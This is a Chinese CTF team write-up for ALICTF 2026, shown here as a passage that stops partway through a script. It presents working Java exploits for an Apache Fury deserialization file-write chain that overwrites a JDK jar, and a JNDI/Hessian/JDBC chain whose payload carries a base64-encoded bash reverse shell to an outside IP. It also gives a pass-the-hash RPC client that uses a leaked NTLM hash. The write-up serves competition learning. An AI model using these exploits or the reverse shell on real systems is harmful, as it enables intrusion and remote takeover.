---
title: 2026 ALICTF SU WriteUp
date: 2026-02-02T22:24:15+08:00
slug: "alictf-su-2026-wu"
tags: ["alictf"]
---

本次 ALICTF 我们 SU 取得了 第十名 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系baozongwi QQ:2405758945。

以下是我们 SU 本次 2026 ALICTF 的 WriteUp。

<!--more-->

![img](1.png)

# Web

## Fileury

自 RCTF 一役沉寂许久，中间更是在 0CTF 被打得找不着北，未曾想今朝阿里云 CTF 竟让我寻回了用武之地。

话不多说，直接看题，题目使用 Apache Fury 进行反序列化，配置如下：

```Java
Fury fury = Fury.builder()
    .withLanguage(Language.JAVA)
    .requireClassRegistration(false)  // 允许反序列化未注册类
    .build();
Object obj = fury.deserialize(Base64.getDecoder().decode(input));
```

Fury 通过 `fury/disallowed.txt` 维护一份类黑名单，在反序列化时会检查类名是否在黑名单中。

**黑名单检查逻辑** (`DisallowedList.java`):

```Java
static void checkNotInDisallowedList(String clsName) {
    if (DEFAULT_DISALLOWED_LIST_SET.contains(clsName)) {
        throw new InsecureException(String.format("%s hit disallowed list", clsName));
    }
}
```

黑名单包含了大部分常用反序列化 Gadget 类:

复盘去年 WP 发现，当前环境缺失了 `com.feilong` 依赖，导致二次反序列化绕过黑名单的方案失效，这也意味着挖掘新利用链

![img](2.png)

先分析一下黑名单，包含了大部分常用反序列化 Gadget 类:

| Gadget 类                       | 状态                                    |
| ------------------------------- | --------------------------------------- |
| `TemplatesImpl`                 | ❌ 被拦截                                |
| `InvokerTransformer`            | ❌ 被拦截                                |
| `ChainedTransformer`            | ❌ 被拦截                                |
| `ConstantTransformer`           | ❌ 被拦截                                |
| `TiedMapEntry`                  | ❌ 未在黑名单但依赖的 Transformer 被拦截 |
| `BadAttributeValueExpException` | ❌ 被拦截                                |

**未被拦截的关键类**:

- `org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap`
- `org.apache.commons.collections.map.LazyMap`
- `org.apache.commons.collections.keyvalue.TiedMapEntry`
- `org.apache.commons.collections.comparators.TransformingComparator`
- `org.apache.commons.collections.functors.ConstantFactory`
- `org.apache.commons.collections.functors.StringValueTransformer`

起初试图复刻去年的思路挖掘二次反序列化，但此路俺没走通，失败了

![img](3.png)

就在一筹莫展之际，猛地想起老大梅子酒在 Non-RCE 题解中提到的 `StoreableCachingMap` 链子。这条链子能实现任意路径写文件，幸运地避开了黑名单的拦截**！**

```Java
HashSet.readObject()
    HashMap.put()
        HashMap.hash()
            TiedMapEntry.hashCode()
                TiedMapEntry.getValue()
                    LazyMap.get()
                        SimpleCache$StorableCachingMap.put()
                            SimpleCache$StorableCachingMap.writeToPath()
                                FileOutputStream.write()
```

![img](4.png)

**适配Fury 完整****POC****如下：**

```Java
package reproduce;

import org.apache.commons.collections.comparators.TransformingComparator;
import org.apache.commons.collections.functors.ConstantFactory;
import org.apache.commons.collections.functors.StringValueTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.fury.Fury;
import org.apache.fury.config.Language;

import java.io.FileOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;
import java.util.PriorityQueue;

public class ExpAspectJ {

    public static void main(String[] args) throws Exception {
        // Goal: Arbitrary File Write
        // Chain:
        // PriorityQueue.readObject() -> heapify() -> comparator.compare()
        // comparator = TransformingComparator(StringValueTransformer)
        // transformer.transform(TiedMapEntry) -> TiedMapEntry.toString()
        // TiedMapEntry.toString() -> getValue() -> map.get(key)
        // map = LazyMap(StoreableCachingMap, ConstantFactory(bytes))
        // LazyMap.get(key) -> factory.create(key) -> bytes
        // LazyMap.put(key, bytes) -> StoreableCachingMap.put(key, bytes) -> write bytes to file 'key'
        byte[] content = Files.readAllBytes(Paths.get("dnsns.jar"));

        String filename = "../../../../../../../../../usr/local/openjdk-8/jre/lib/ext/dnsns.jar";
//        byte[] content = cronPayload.getBytes();

        // 1. Setup StoreableCachingMap (The Inner Map)
        // Ensure access to the class
        Class<?> scMapClass = Class.forName("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
        Constructor<?> constructor = scMapClass.getDeclaredConstructor(String.class, int.class);
        constructor.setAccessible(true);
        // folder = ".", maxEntries = 100
        Map storeableMap = (Map) constructor.newInstance(".", 100);

        // 2. Setup LazyMap with ConstantFactory
        ConstantFactory factory = new ConstantFactory(content);
        Map lazyMap = LazyMap.decorate(storeableMap, factory);

        // 3. Setup TiedMapEntry
        TiedMapEntry entry = new TiedMapEntry(lazyMap, filename);

        // 4. Setup Comparator and Transformer
        // StringValueTransformer calls String.valueOf(obj) which calls obj.toString() (if not null)
        org.apache.commons.collections.Transformer transformer = StringValueTransformer.getInstance();
        TransformingComparator comparator = new TransformingComparator(transformer);

        // 5. Setup PriorityQueue
        PriorityQueue queue = new PriorityQueue(2, comparator);

        Field sizeField = PriorityQueue.class.getDeclaredField("size");
        sizeField.setAccessible(true);
        sizeField.set(queue, 2);

        Field queueField = PriorityQueue.class.getDeclaredField("queue");
        queueField.setAccessible(true);
        Object[] queueArray = new Object[2];
        queueArray[0] = entry;
        queueArray[1] = entry;
        queueField.set(queue, queueArray);

        // 6. Serialize with Fury
        System.out.println("Serializing AspectJ Chain with Fury...");
        Fury fury = Fury.builder().withLanguage(Language.JAVA).requireClassRegistration(false).build();
        byte[] serializedInfo = fury.serialize(queue);

        String b64 = Base64.getEncoder().encodeToString(serializedInfo);
        FileOutputStream fos = new FileOutputStream("payload_aj.b64");
        fos.write(b64.getBytes());
        fos.close();
        System.out.println("AspectJ Payload saved to payload_aj.b64");
    }
}
```

**利用链触发流程**:

```Plain
PriorityQueue.readObject()
  → heapify()
  → siftDown()
  → comparator.compare(queue[0], queue[1])
  → TransformingComparator.compare()
  → StringValueTransformer.transform(TiedMapEntry)
  → String.valueOf(TiedMapEntry)
  → TiedMapEntry.toString()
  → TiedMapEntry.getValue()
  → LazyMap.get(key)
  → factory.create()                    [ConstantFactory 返回预设的 byte[]]
  → StoreableCachingMap.put(key, value)
  → 写入文件 key，内容为 value
```

有了写文件能力，我以为胜券在握。尝试了包括但不限于计划任务、LD_Preload、charsets.jar 等各种写入姿势，结果竟无一奏效。苦也！这波折腾直接把狂子写到怀疑人生，当时心凉半截，只道是这一血要拱手让人了

![img](5.png)

正所谓山重水复疑无路，柳暗花明又一村。绝境中忽忆起一篇 FastJson 写入绕过的文章，妙招在于开启 `-verbose:class` 参数，通过监控类加载情况，精准定位未被加载的 JAR 包实施覆盖利用。

通过监控类加载情况，`dnsns.jar` 没有被加载！

```Prolog
2026-02-02 13:51:14 [Loaded java.util.concurrent.ThreadPoolExecutor$AbortPolicy from /usr/local/openjdk-8/jre/lib/rt.jar]
2026-02-02 13:51:14 [Loaded java.util.concurrent.ThreadPoolExecutor$CallerRunsPolicy from /usr/local/openjdk-8/jre/lib/rt.jar]
2026-02-02 13:51:14 [Loaded java.util.concurrent.ThreadPoolExecutor$DiscardOldestPolicy from /usr/local/openjdk-8/jre/lib/rt.jar]
2026-02-02 13:51:14 [Loaded java.util.concurrent.ThreadPoolExecutor$DiscardPolicy from /usr/local/openjdk-8/jre/lib/rt.jar]
2026-02-02 13:51:14 [Loaded org.jboss.threads.JBossExecutors$3 from file:/app/app.jar]
2026-02-02 13:51:14 [Loaded org.jboss.threads.NullRunnable from file:/app/app.jar]
2026-02-02 13:51:14 [Loaded org.jboss.threads.JBossExecutors$5 from file:/app/app.jar]
2026-02-02 13:51:14 [Loaded java.lang.IllegalAccessError from /usr/local/openjdk-8/jre/lib/rt.jar]
2026-02-02 13:51:14 [Loaded org.jboss.threads.LoggingUncaughtExceptionHandler from file:/app/app.jar]
2026-02-02 13:51:14 [Loaded org.wildfly.common.cpu.ProcessorInfo from file:/app/app.jar]
2026-02-02 13:51:14 [Loaded sun.nio.cs.US_ASCII$Decoder from /usr/local/openjdk-8/jre/lib/rt.jar]
2026-02-02 13:51:14 [Loaded org.jboss.threads.Version from file:/app/app.jar]
2026-02-02 13:51:14 [Loaded org.jboss.threads.Messages from file:/app/app.jar]
2026-02-02 13:51:14 [Loaded org.jboss.threads.Messages_$logger from file:/app/app.jar]
2026-02-02 13:51:14 [Loaded org.jboss.threads.StoppedExecutorException from file:/app/app.jar]
2026-02-02 13:51:14 [Loaded org.jboss.threads.EnhancedQueueExecutor$MBeanUnregisterAction from file:/app/app.jar]
2026-02-02 13:51:14 [Loaded org.jboss.threads.EnhancedQueueExecutor$MXBeanImpl from file:/app/app.jar]
2026-02-02 13:51:14 [Loaded org.jboss.threads.Waiter from file:/app/app.jar]
2026-02-02 13:51:14 [Loaded java.util.concurrent.atomic.Striped64 from /usr/local/openjdk-8/jre/lib/rt.jar]
2026-02-02 13:51:14 [Loaded java.util.concurrent.atomic.LongAdder from /usr/local/openjdk-8/jre/lib/rt.jar]
```

这意味着可以通过反序列化

`sun.net.spi.nameservice.dns.DNSNameServiceDescriptor`触发`dnsns.jar`加载。这一记回马枪，直接让死局复活

```Java
package reproduce;

import org.apache.fury.Fury;
import org.apache.fury.config.Language;
import java.io.FileOutputStream;
import java.util.Base64;

public class ExpDNS {
    public static void main(String[] args) throws Exception {
        System.out.println("Generating payload to load sun.net.spi.nameservice.dns.DNSNameServiceDescriptor...");

        Fury fury = Fury.builder()
                .withLanguage(Language.JAVA)
                .requireClassRegistration(false)
                .build();

        // Load the class via reflection to avoid compilation errors if access is restricted
        Class<?> clazz = Class.forName("sun.net.spi.nameservice.dns.DNSNameServiceDescriptor");
        Object instance = clazz.newInstance();

        byte[] payload = fury.serialize(instance);
        String b64 = Base64.getEncoder().encodeToString(payload);

        try (FileOutputStream fos = new FileOutputStream("payload_dns.b64")) {
            fos.write(b64.getBytes());
        }

        System.out.println("Payload saved to payload_dns.b64");
        System.out.println("Payload Base64: " + b64);
    }
}
```

至于`dnsns.jar` 怎么改？驰骋AWDP赛场的诸君，像这种`JarEditor` 手改字节码的基操，想必无需我多言了，对吧？

![img](6.png)

先发包覆盖`dnsns.jar` ，再发包触发恶意类加载，完成RCE

![img](7.png)

比赛结束后，我试图向她解释什么是 Apache Fury 的黑名单绕过，解释那个 `dnsns.jar` 的覆盖是多么的神来之笔。她只是淡淡地看了我一眼转身就走了

那一刻我才明白

**可惜她不懂JAVA，也不懂我的⚡超！⚡级！⚡炎！🔥舞！🔥爆！⚡爆！⚡回！⚡**

![img](8.png)

参考资料：

1. [AliyunCTF2025 题解之 Jtools Fury 反序列化利用分析](https://mp.weixin.qq.com/s/dMl0aEg6p7w7MKlUe7pCdg?poc_token=HO5E0WejTX00WfrQI8oI22YsiTkxiEcLfLgbYyWv)
2. [AliyunCTF2025-JTools分析](https://eddiemurphy89.github.io/2025/03/01/AliyunCTF2025-JTools分析/#前言)
3. [Servlet中的时间竞争及AspectJWeaver反序列化Gadget构造[non-RCE 题解\]](https://meizjm3i.github.io/2021/03/07/Servlet中的时间竞争以及AsjpectJWeaver反序列化Gadget构造-AntCTFxD-3CTF-non-RCE题解/)
4. [[Java Puzzle #3 WP\] Fastjson write ascii JAR RCE](https://mp.weixin.qq.com/s/9e0V4bnV6fuGAfO1AKLYdw)
5. [可惜她不玩街霸，也没人懂我的⚡超！⚡级！⚡炎！🔥舞！🔥爆！⚡爆！⚡回！⚡](https://www.bilibili.com/video/BV1kdnszCEUy/?spm_id_from=333.337.search-card.all.click&vd_source=6870219ddced853e80ae239d5319e97c)

## MHGA

我曾经发誓这辈子不会再为Java流泪，但MHGA这JNDI+Hessian+JDBC组合洞的韧性让我哭花了妆😭😭😭

### **入口点**

题目提供了一个 Spring Boot 应用，核心在于 `Web.java` 提供了一个 HTTP 接口，该接口接受一个 `X-Lookup-URL` 头，并对其进行 JNDI `lookup`。

```Java
// Web.java
String url = exchange.getRequestHeaders().getFirst("X-Lookup-URL");
new InitialContext().lookup(url);
```

这是一个典型的 JNDI 注入入口，JDK版本为 OpenJDK 11.0.29 

### **Stage 1:**  **Hessian** **链构造**

题目名称暗示了 Hessian。检查依赖发现 `com.caucho.hessian.client.HessianProxyFactory` 实现了 `javax.naming.spi.ObjectFactory`。

可以通过 JNDI 返回一个 `Reference` 指向 `HessianProxyFactory`，所有的 `Reference` 属性都会被转化为 Hessian 代理的配置。

当 JNDI 进行 `getObjectInstance` 时，返回的是一个 Hessian 代理对象。如果后续对这个代理对象调用了方法，就会触发 Hessian 反序列化请求。

```Java
// HessianProxyFactory.java
public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
    Reference ref = (Reference)obj;
    String api = null;
    String url = null;

    for (int i = 0; i < ref.size(); i++) {
        RefAddr addr = ref.get(i);
        String type = addr.getType();
        String value = (String)addr.getContent();
        // 提取 Reference 中的配置
        if (type.equals("type")) {
            api = value; // 代理接口类型
        } else if (type.equals("url")) {
            url = value; // 目标 URL
        }
        // ... user, password ...
    }
    // 创建 Hessian 代理
    Class apiClass = Class.forName(api, false, this._loader);
    return this.create(apiClass, url);
}
```

**利用点**：

攻击者可以通过 JNDI 返回一个精心构造的 `Reference`：

1. **Factory Class**: `com.caucho.hessian.client.HessianProxyFactory` (本地存在)。
2. **type**: 设置为任意接口（例如 `javax.naming.directory.DirContext`）。
3. **url**: 设置为攻击者控制的 HTTP 地址。

当 `JndiLoginModule` 获取到这个对象后，它实际上是一个 Hessian 代理。一旦它调用该对象的任何方法（如 `DirContext.search`），Hessian 代理就会拦截调用，并通过 HTTP POST 请求将方法调用序列化发送给攻击者的 URL。

攻击者响应该 HTTP 请求时，返回一个恶意的 Hessian 序列化数据（RPC Reply），客户端在收到响应后会反序列化该数据，从而触发 Gadget Chain。

至于Hessian Payload，发现存在Jackson依赖就好办了，使用 `Jackson POJONode` 触发 `UnixPrintService`的getter 方法达成RCE 

2026 年了，不识 `UnixPrintService`，纵称英雄也枉然，快去学习我大哥yemoli在KCON2023首秀的《**Magic In Java** **API**》议题

![img](9.png)

**完整****POC****如下（** **Hessian** **序列化****数据必须是 2.0** **RPC** **Reply 格式）：**

```Java
package org.example;

import com.caucho.hessian.io.Hessian2Output;
import com.caucho.hessian.io.SerializerFactory;
import com.databricks.client.jdbc.internal.fasterxml.jackson.databind.node.POJONode;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.*;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicReference;

import static common.Reflections.newInstanceWithoutConstructor;
import static common.Reflections.setFieldValue;
import static common.Util.makeMap;
import static java.lang.reflect.AccessibleObject.setAccessible;

public class ExploitGenerator {

    // 目标文件路径
//    private static final String cmd = ";touch /tmp/pwnnnnn";
    private static final String cmd = "; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8yMjMuMTA5LjQ5LjUxLzk5OTkgMD4mMQ== | base64 -d | bash; echo";

    public static void main(String[] args) throws Exception {

        Class<?> unsafeClass = Class.forName("sun.misc.Unsafe");
        Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
        unsafeField.setAccessible(true);
        Object unsafe = unsafeField.get(null);
        Method allocateInstance = unsafeClass.getMethod("allocateInstance", Class.class);

        // 3. 实例化 UnixPrintService (替换之前的 Proxy)
        // 这个类在 PrintServiceLookupProvider 中被广泛使用，是合法的 PrintService 实现
        Class<?> unixPrintServiceClass = Class.forName("sun.print.UnixPrintService");
        Object service = allocateInstance.invoke(unsafe, unixPrintServiceClass);

        setFieldValue(service, "printer", cmd);
        setFieldValue(service, "isInvalid", false);
        setFieldValue(service, "lpcStatusCom", new String[]{"", "", "", ""});

        POJONode pojoNode = new POJONode(service);

//
        // ---------------------------------------------------------
        // 5. Hessian2 序列化 (关键修复部分)
        // ---------------------------------------------------------
        byte[] payload = Hessian2_serialize(pojoNode);

        // 6. 输出 Base64
        String base64Payload = Base64.getEncoder().encodeToString(payload);
        System.out.println("----- Payload (Base64) -----");
        System.out.println(base64Payload);
        System.out.println("----------------------------");
    }

    public static byte[] Hessian2_serialize(Object o) throws IOException {
        SerializerFactory factory = new SerializerFactory();
        factory.setAllowNonSerializable(true);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        Hessian2Output hessian2Output = new Hessian2Output(baos);
        baos.write('H');  // Hessian 2.0 call header
        baos.write(0x02); // major version
        baos.write(0x00); // minor version
        baos.write('R');  // Reply marker
        baos.write(67);
        hessian2Output.setSerializerFactory(factory);
        hessian2Output.writeObject(o);
        hessian2Output.flush();
        return baos.toByteArray();
    }

    public static void setAccessible(AccessibleObject member) {
        String versionStr = System.getProperty("java.version");
        int javaVersion = Integer.parseInt(versionStr.split("\\.")[0]);

        // not possible to quiet runtime warnings anymore...
        // see https://bugs.openjdk.java.net/browse/JDK-8210522
        // to understand impact on Permit (i.e. it does not work
        // anymore with Java >= 12)
        member.setAccessible(true);
    }

}
```

直接通过 JNDI 返回 Hessian 代理对象并不会立即触发 RCE，因为 `InitialContext.lookup` 仅仅返回对象，并不一定会调用其任意方法。

### **Stage 2:  ViburDBCPObjectFactory到 Databricks** **JDBC**

首先想到的是浅蓝师傅的《探索高版本 JDK 下 JNDI 漏洞的利用方法》提到的`LookupRef` 可以触发二次JNDI请求，后续会调用getClass()方法，触发hessian反序列化，但是其只存在在Tomcat 依赖中

难道这就陷入到僵局了嘛，Bro😭😭😭

```Java
LookupRef ref = new LookupRef("java.lang.String","look");
ref.add(new StringRefAddr("factory", "com.caucho.hessian.client.HessianProxyFactory"));
//com.caucho.burlap.client.BurlapProxyFactory
ref.add(new StringRefAddr("type", "java.lang.AutoCloseable"));
ref.add(new StringRefAddr("url", "http://127.0.0.1:6666/"));
@Override
public Object getObjectInstance(Object obj, Name name, Context nameCtx,
        Hashtable<?, ?> environment) throws Exception {

    String lookupName = null;
    Object result = null;

    if (obj instanceof LookupRef) {
        Reference ref = (Reference) obj;
        ObjectFactory factory = null;
        RefAddr lookupNameRefAddr = ref.get(LookupRef.LOOKUP_NAME);
        if (lookupNameRefAddr != null) {
            lookupName = lookupNameRefAddr.getContent().toString();
        }

        try {
            if (lookupName != null) {
                if (!names.get().add(lookupName)) {
                    String msg = sm.getString("lookupFactory.circularReference", lookupName);
                    NamingException ne = new NamingException(msg);
                    log.warn(msg, ne);
                    throw ne;
                }
            }
            RefAddr factoryRefAddr = ref.get(Constants.FACTORY);
            if (factoryRefAddr != null) {
                // Using the specified factory
                String factoryClassName = factoryRefAddr.getContent().toString();
                // Loading factory
                ClassLoader tcl = Thread.currentThread().getContextClassLoader();
                Class<?> factoryClass = null;
                if (tcl != null) {
                    try {
                        factoryClass = tcl.loadClass(factoryClassName);
                    } catch (ClassNotFoundException e) {
                        NamingException ex = new NamingException(
                                sm.getString("lookupFactory.loadFailed"));
                        ex.initCause(e);
                        throw ex;
                    }
                } else {
                    try {
                        factoryClass = Class.forName(factoryClassName);
                    } catch (ClassNotFoundException e) {
                        NamingException ex = new NamingException(
                                sm.getString("lookupFactory.loadFailed"));
                        ex.initCause(e);
                        throw ex;
                    }
                }
                if (factoryClass != null) {
                    try {
                        factory = (ObjectFactory) factoryClass.getConstructor().newInstance();
                    } catch (Throwable t) {
                        if (t instanceof NamingException)
                            throw (NamingException) t;
                        NamingException ex = new NamingException(
                                sm.getString("lookupFactory.createFailed"));
                        ex.initCause(t);
                        throw ex;
                    }
                }
            }
            // Note: No defaults here
            if (factory != null) {
                result = factory.getObjectInstance(obj, name, nameCtx, environment);
            } else {
                if (lookupName == null) {
                    throw new NamingException(sm.getString("lookupFactory.createFailed"));
                } else {
                    result = new InitialContext().lookup(lookupName);
                }
            }

            Class<?> clazz = Class.forName(ref.getClassName());
            if (result != null && !clazz.isAssignableFrom(result.getClass())) {
                String msg = sm.getString("lookupFactory.typeMismatch",
                        name, ref.getClassName(), lookupName, result.getClass().getName());
                NamingException ne = new NamingException(msg);
                log.warn(msg, ne);
                // Close the resource we no longer need if we know how to do so
                if (isInstance(result.getClass(), "java.lang.AutoCloseable")) {
                    try {
                        Method m = result.getClass().getMethod("close");
                        m.invoke(result);
                    } catch (Exception e) {
                        // Ignore
                    }
                }
                throw ne;
            }
        } finally {
            names.get().remove(lookupName);
        }
    }


    return result;
}
```

![img](10.png)

继续分析发现还存在ViburDBCPObjectFactory 可以利用，其中，允许通过 JNDI Reference 实例化并配置一个 DataSource，且会自动调用其 `start()`方法内部调用 `DriverManager.getDriver(jdbcUrl)`，从而触发JDBC 攻击

值得庆幸的是有 Databricks JDBC 驱动且存在CVE-2024-49194 会触发JNDI注入，

搭建 HTTP 服务器，提供 `jaas.conf`：

```Plain
Client {
   com.sun.security.auth.module.JndiLoginModule required
   user.provider.url="ldap://attacker:1389/Hessian/Exploit"
   group.provider.url="test"
   tryFirstPass="true";
};
```

当 JDBC 驱动加载此配置并进行身份验证时，`JndiLoginModule` 会读取 `user.provider.url` 并执行 `ctx.lookup()`，那么整条攻击链条就瞬间闭环了

**攻击链路：**

1. **Attacker**: 发送 `X-Lookup-URL: ldap://attacker/Vibur/Exploit`
2. **Server**: JNDI lookup -> `ViburDBCPObjectFactory`
3. **Vibur**: 创建 DataSource -> 连接 JDBC URL
4. **JDBC**: 下载 `http://attacker/jaas.conf` -> 加载 `JndiLoginModule`
5. **JAAS**: JndiLoginModule lookup `ldap://attacker/Hessian/Exploit`
6. **Hessian**: 返回 `HessianProxy` (代理 `DirContext`)
7. **JAAS**: 调用 `proxy.search()` -> 触发 Hessian 请求
8. **Server**: 反序列化 Hessian Payload -> `UnixPrintService` -> RCE
9. **RCE**: `chmod 444 /flag && cat /flag` -> CAT FLAG

![img](11.png)

### Stage 3:  获取FLAG

改写x1r0z 师傅的`JNDIMap` 项目修改参考 https://github.com/N1etzsche0/JNDIMap

![img](12.png)

爽！😎这才叫RCE🎶！😋👍爽！😎这才叫RCE🎶！😋👍😎这才叫RCE🎶！

![img](13.png)

GGWP

青山不改，绿水长流。山水有相逢，下篇WP再见

![img](14.png)

参考资料：

1. [Magic In Java Api](https://github.com/knownsec/KCon/blob/master/2023/Magic In Java Api.pdf)
2. [探索高版本 JDK 下 JNDI 漏洞的利用方法](https://tttang.com/archive/1405/)
3. [CVE-2024-49194 Databricks JDBC 驱动 JNDI 注入漏洞分析](https://mp.weixin.qq.com/s/UdKf8PhTlXuWwfBDQXDGuA)
4. [JNDIMap](https://github.com/X1r0z/JNDIMap)
5. [NIKO15次梦碎Major](https://www.bilibili.com/video/BV1AZmEBVEsU/?share_source=copy_web&vd_source=8c76f8e232993e8e3083ed467fe773f7)、[😭一生只哭18次😭](https://www.bilibili.com/video/BV1GEm9BoEnq/?spm_id_from=333.337.search-card.all.click&vd_source=6870219ddced853e80ae239d5319e97c)、[【活着】“所以生命啊，它苦涩如歌”](https://www.bilibili.com/video/BV15Y4y117sn/?share_source=copy_web&vd_source=8c76f8e232993e8e3083ed467fe773f7)

## Backup Exec

Re + Web

题目说明了攻击路径+flag路径，任务就是复盘+读取 `C:\Users\Administrator\Desktop\flag.txt`

非常善良的题目 甚至给了pdb 直接狠狠拖入IDA

用 IDA-NO-MCP 导出一下让AI分析

```Markdown
逆向 RPC 分析过程

  1. 快速确认是 RPC 服务

  - 在 imports 里看到 RPCRT4.dll，大量 RpcServer* / NdrServerCall* 函数。
  - 在 strings 里能搜到 ncacn_ip_tcp、RpcServerRegisterIf2 等关键字。
    → 确认为 RPC over TCP。

  2. 定位启动函数与端口

  - 在 IDA 里找 RpcServerUseProtseqEpW 调用点，对应函数名 StartRPCServer。
  - 函数里写死端口列表：69128, 62831, 67540, 60325, 63588，按顺序尝试，成功即监听。
  - 输出日志里打印 [Server] Using port %d，用于验证逻辑。

  3. 认证/授权逻辑

  - RpcServerRegisterIf2(..., AuthorizationFunc) 表示注册了授权回调。
  - AuthorizationFunc → IsClientInBackupAdminGroup。
  - 在 IsClientInBackupAdminGroup 里看到 ConvertStringSidToSidW("S-1-5-21-...-1624")
    → 组 SID 被硬编码（必须是该组成员）。
  - 还会 RpcImpersonateClient + OpenThreadToken + TokenGroups + EqualSid 做组验证。

  4. RPC 通信加密强制

  - CheckClientSecurityLevel 调用 RpcBindingInqAuthClientW，判断 authLevel >= 6
    也就是 RPC_C_AUTHN_LEVEL_PKT_PRIVACY。
    → 必须开启签名+加密。

  5. 用 PDB 还原接口结构

  - 用 llvm-pdbutil dump --globals 找到：
      - FileTransfer___RpcServerInterface
      - FileTransfer_v1_0_DispatchTable
      - FileTransfer_ServerRoutineTable
  - 通过 PDB 给出的地址，去 .rdata 里解析 _RPC_SERVER_INTERFACE 结构。
    解析方式：

    file_offset = section_file_offset + (VA - image_base - section_VA)
  - 从 _RPC_SERVER_INTERFACE 解析到接口 UUID：
    62e00289-44bd-497b-b85f-bc340fbcc2b0 版本 1.0

  6. 还原 opnum -> 函数映射

  - FileTransfer_ServerRoutineTable 是函数指针表。
  - 读到的顺序即为 opnum：
    0. OpenRemoteFile
      1. ReadFileData
      2. CloseFileHandle
      3. GetFileInfo
      4. ListDirectory
      5. ShutdownServer

  7. 解析 MIDL 参数/返回结构

  - PDB 中还有 FileTransfer__MIDL_ProcFormatString 和 FileTransfer_FormatStringOffsetTable。
  - 通过偏移表（0x0, 0x3c, 0x84, 0xa8, 0xde, 0x120）定位每个 op 的 NDR 格式。
  - 结合返回包实际长度，确认 OpenRemoteFile 的 out 参数是按值返回而不是指针。
    返回结构实际布局：

    [20 bytes ctx_handle]
    [4 bytes padding]
    [8 bytes fileSize]
    [4 bytes error]
    [1 byte return]

  8. XOR 加密逻辑

  - ReadFileData 中明确调用 XOREncryptDecrypt。
  - PDB 可定位 XOR_KEY 全局变量地址，从 .rdata 直接取 16 字节密钥：
    2a7fc3915e348b19d267f428ab76439d

  ———

  总结要点（RPC 逆向得到的核心结论）

  - 协议：ncacn_ip_tcp
  - 端口优先级：69128 → 62831 → 67540 → 60325 → 63588
  - 接口 UUID：62e00289-44bd-497b-b85f-bc340fbcc2b0 v1.0
  - 必须 PKT_PRIVACY 认证
  - 组成员 SID 必须为 ...-1624
  - opnum 映射固定 0~5
  - ReadFileData 返回数据需要 XOR 解密
```

整理一下得到的信息

```Plain
RPC 服务
协议：ncacn_ip_tcp
端口选择顺序：
    69128 → 62831 → 67540 → 60325 → 63588
接口 UUID：
    62e00289-44bd-497b-b85f-bc340fbcc2b0 v1.0
调用必须：
    PKT_PRIVACY（RPC_AUTHN_LEVEL_PKT_PRIVACY）
    组成员校验：硬编码 SID
    S-1-5-21-3223156632-3195994233-1317593892-1624
RPC 方法（opnum）
    OpenRemoteFile
    ReadFileData
    CloseFileHandle
    GetFileInfo
    ListDirectory
    ShutdownServer
加密
  ReadFileData 会对文件内容 XOR 加密：
  XOR Key => 2a7fc3915e348b19d267f428ab76439d
```

根据题目中的 `攻击者曾在系统上创建并配置了一个恶意 FTP 服务`，试一下 发现可以匿名登录 anonymous

![img](23.png)

然后在 `microsoft `目录下发现 `results.txt`，内容是 mimikatz dcsync /all 输出，包含大量 NTLM 哈希

```Plain
SAM Username         : Server Backup Operators
Object Security ID   : S-1-5-21-3223156632-3195994233-1317593892-1624
Object Relative ID   : 1624
```

找到 `RPC` 要求的 SID 组

理论上可能是要用查询下 `Server Backup Operators` 组成员吧

但是我环境好像有问题 就把Username提出来猜了几个，发现 `svc_dbbackup` 是对的

```Python
from impacket.dcerpc.v5 import transport, rpcrt
import struct

TARGET="116.62.114.4"
PORT=62831
DOMAIN="corp.local"
USER="svc_dbbackup"
NTHASH="eb2c652c8e8bfeed348d66ffa98be0d1"

KEY = bytes.fromhex('2a7fc3915e348b19d267f428ab76439d')

def xor_dec(data):
    return bytes(b ^ KEY[i % 16] for i, b in enumerate(data))

def ndr_wstring_ref(s):
    w = s.encode("utf-16-le") + b"\x00\x00"
    n = len(w)//2
    stub = struct.pack("<III", n, 0, n) + w
    if len(stub) % 4:
        stub += b"\x00"*(4-len(stub)%4)
    return stub

def open_file(dce, path):
    dce.call(0, ndr_wstring_ref(path))
    resp = dce.recv()

    ctx = resp[:20]  # context handle
    # align to 8
    fsize = struct.unpack_from("<Q", resp, 24)[0]
    err   = struct.unpack_from("<I", resp, 32)[0]
    ret   = resp[36] if len(resp) > 36 else None
    return ctx, fsize, err, ret

def read_file(dce, ctx, offset, size):
    stub = ctx + struct.pack("<II", offset, size)
    dce.call(1, stub)
    resp = dce.recv()

    # 尝试按「无指针 + conformant array」解析
    off = 0
    maxc, offc, act = struct.unpack_from("<III", resp, off); off += 12
    buf = resp[off:off+act]; off += act
    if off % 4:
        off += (4 - off % 4)

    bytes_read = struct.unpack_from("<I", resp, off)[0]; off += 4
    err = struct.unpack_from("<I", resp, off)[0]; off += 4
    ret = resp[off] if off < len(resp) else None
    return buf, bytes_read, err, ret, resp

def main():
    t = transport.DCERPCTransportFactory(f"ncacn_ip_tcp:{TARGET}[{PORT}]")
    t.set_credentials(USER, '', DOMAIN, lmhash='', nthash=NTHASH)
    dce = t.get_dce_rpc()
    dce.set_auth_type(rpcrt.RPC_C_AUTHN_WINNT)
    dce.set_auth_level(rpcrt.RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
    dce.connect()
    dce.bind(b'\x89\x02\xe0\x62\xbd\x44\x7b\x49\xb8\x5f\xbc\x34\x0f\xbc\xc2\xb0\x01\x00\x00\x00')

    ctx, fsize, err, ret = open_file(dce, r"C:\\Users\\Administrator\\Desktop\\flag.txt")
    print("Open:", "fsize=", fsize, "err=", err, "ret=", ret)

    if err != 0 or ret == 0:
